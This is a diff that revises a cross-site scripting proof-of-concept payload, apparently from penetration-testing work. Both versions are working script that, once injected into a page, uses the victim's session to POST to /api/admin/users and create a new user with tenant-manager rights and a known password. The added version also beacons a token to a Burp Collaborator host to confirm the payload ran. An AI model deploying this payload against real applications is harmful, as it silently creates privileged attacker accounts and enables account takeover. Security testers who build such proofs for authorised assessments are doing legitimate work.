@@ -1,1 +1,11 @@
-<script>x=new XMLHttpRequest;x.open("POST","/api/admin/users",true);x.withCredentials=1;x.setRequestHeader("Content-Type","application/json");x.send('{"firstName":"XSS","lastName":"PoC","emailAddress":"xss.demo@gmail.com","password":"XSSDemo2025!","resetPasswordRequired":false,"tenantManager":true,"attachmentManager":true,"userGroupId":"01KBN1Z2X7WH11VCN7GDK342X1","organizationLimited":false}')</script>
+<script>
+let r = Math.random().toString(36).slice(2,9);
+
+let x = new XMLHttpRequest;
+x.open("POST","/api/admin/users",true);
+x.withCredentials = true;
+x.setRequestHeader("Content-Type","application/json");
+x.send(`{"firstName":"XSS","lastName":"PoC","emailAddress":"xss.demo.${r}@pentestexample.com","password":"XSSDemo2025!","resetPasswordRequired":false,"tenantManager":true,"attachmentManager":true,"userGroupId":"01KBN1Z2X7WH11VCN7GDK342X1","organizationLimited":false}`);
+
+new Image().src = `https://your-collaborator.burpcollaborator.net/xss?token=${r}`;
+</script>
